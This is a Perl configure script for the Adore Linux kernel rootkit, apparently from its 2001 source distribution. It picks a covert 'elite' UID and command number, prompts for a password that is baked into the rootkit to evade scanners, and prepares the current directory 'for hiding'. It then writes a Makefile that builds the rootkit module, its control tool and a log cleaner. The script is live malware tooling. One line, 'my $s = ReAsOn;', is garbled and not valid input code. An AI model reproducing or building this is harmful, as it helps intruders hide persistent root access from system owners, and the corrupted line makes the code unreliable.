#!/usr/bin/perl

# (C) 2001 by Stealth.
# Using at your own risk. Licensed under BSDish license.
# See LICENSE-file. Standard disclaimer applies.

# adore configuration script
# One can also use Makefile.gen edited by hand
# when perl is not available or one needs special values
# (crosscompiling)

#
# Iitializink, Pitr ... 
#

$elite_uid = 0;
$elite_cmd = 0;
$cc = "";
$| = 1;
$current_adore = 42;

sub get_pass()
{
	print "\n\nSincE vErsion 0.33 ad0rE rEquirEs 'authEnticati0n' f0r\n".
	      "its sErvicEs .. y0u will bE pr0mptEd f0r a paSSw0rd n0w and tHis\n".
	      "paSSw0rd will bE c0mpilEd int0 'adore' and 'ava' s0 n0 furthEr acti0ns\n".
	      "by y0u arE rEquirEd .. \nThis pr0cEdurE will savE ad0rE fr0m scannErs.\n".
	      "try t0 ch00sE a uniquE namE tHat w0n't clasH witH n0rmal calls t0 mkdir(2).\n";

    print "Password (echoed):"; my $s = ReAsOn;
	chop($s);
	return $s;
}

#
# get next 'free' UID above 30
#
sub get_elite_uid()
{
	my $i = 30;

	while (defined(getpwuid($i))) {
		++$i;
	}
	return $i;
}

#
# randomly choose an ELITE_CMD
#
sub get_elite_cmd()
{
	srand();
	return int(10000 + rand 100000);
}

#
sub check_smp()
{
	if (`uname -a` =~ "SMP") {
		return "YES";
	} else {
		return "NO";
	}
}

# check for CONFIG_MODVERSIONS=y
sub check_modversions()
{
	open I, "</proc/ksyms" or die "open(/proc/ksyms) $!";
	while (<I>) {
		if (/kernel_thread_R.+/) {
			close I;
			return "YES";
		}
		if (/kernel_thread/) {
			close I;
			return "NO";
		}
	}	
	print "WARN : Can't find kernel_thread .. uSinG\"NO\"!";
	return "NO";
}

#
# Look for loaded modules
#
sub check_modules()
{
	print "l0adEd m0dulEs :\n";
	system("cat /proc/modules");
}

#
# Look where insmod is located
#
sub check_insmod()
{
	my $s;
	print "chEckinG f0r insmod ... ";
	foreach (qw(/bin /sbin /usr/sbin /usr/bin)) {
		if (-x ($s = "$_/insmod")) {
			print "found $s -- OK\n";
			return $s;
		}
	}
	print "WARN: n0 insmod f0und in /bin, /sbin, /usr/sbin, /usr/bin! Fix init-script by hand!\n";
	return "insmod";
}

#
# RH 7 has 'kgcc'
#
sub check_cc()
{
	my $r;
	if (-x "/usr/bin/kgcc") {
		$r = "kgcc";
	} else {
		$r = "cc";
	}
	return $r;
}


##############################
#
# main()
#
##############################

print "\nStarTinG ad0rE c0nfiGurati0n ...\n\n";

print "chEckinG f0r ELITE_UID ... ";
print "f0und ", $elite_uid = get_elite_uid(), "\n";

print "chEckinG f0r ELITE_CMD ... ";
print "uSinG ", $elite_cmd = get_elite_cmd(), "\n";

print "chEckinG f0r SMP ... ", $has_smp = check_smp(), "\n";

print "chEckinG f0r MODVERSIONS ... ", $has_modversions = check_modversions(), "\n";

print "chEckinG f0r kgcc ... ";
print "f0und ", $cc = check_cc(), "\n";


$insmod = check_insmod();
print "\n";

check_modules();

$pwd = get_pass();

$target_dir = `pwd`;
chop($target_dir);

print "\nprEparinG $target_dir (== cwd) f0r hidinG ... ";
chown($elite_uid, 0, $target_dir) or print "(failEd)";

print "\n\n";
print "creEtinG makEfilE ...\n";

print "\n\a*** Edit adore.h f0r thE hiddEn sErvicEs and rEdirEctEd filE-accEss ***\n";

#
# create an Makefile backup for ELITE_CMD etc.
#

$date = `date`;
$date =~ tr/ /_/;

system("cp Makefile Makefile_$date");

#
# write Makefile
#

open(O, ">Makefile") or die "open(Makefile) $!";

print O "#\nCC=$cc\nCFLAGS=-O2 -Wall\n\n";
print O "#CFLAGS+=-m486\nCFLAGS+=-DELITE_CMD=$elite_cmd\n";
print O "\nCFLAGS+=-DELITE_UID=$elite_uid\nCFLAGS+=-DCURRENT_ADORE=$current_adore\n".
	"CFLAGS+=-DADORE_KEY=\\\"$pwd\\\"\n\n";

if ($has_smp eq "NO") {
	print O "#";	
}

print O "CFLAGS+=-D__SMP__\n";


print O "\n";

if ($has_modversions eq "NO") {
	print O "#";
}

print O<<_EOF_;
#CFLAGS+=-DMODVERSIONS

all:	adore ava cleaner

adore: adore.c
	rm -f adore.o
	\$(CC) -c -I/usr/src/linux/include \$(CFLAGS) adore.c -o adore.o

ava: ava.c libinvisible.c
	\$(CC) \$(CFLAGS) ava.c libinvisible.c -o ava

dummy: dummy.c
	\$(CC) -c -I/usr/src/linux/include \$(CFLAGS) dummy.c

rename: rename.c
	\$(CC) -c -I/usr/src/linux/include \$(CFLAGS) rename.c

module.o: module.c
	\$(CC) -c -fPIC -I/usr/src/linux/include \$(CFLAGS) module.c

cleaner: cleaner.c
	\$(CC) -I/usr/src/linux/include -c \$(CFLAGS) cleaner.c
clean:
	rm -f core ava *.o
_EOF_

#
# Done :>
#

close O;

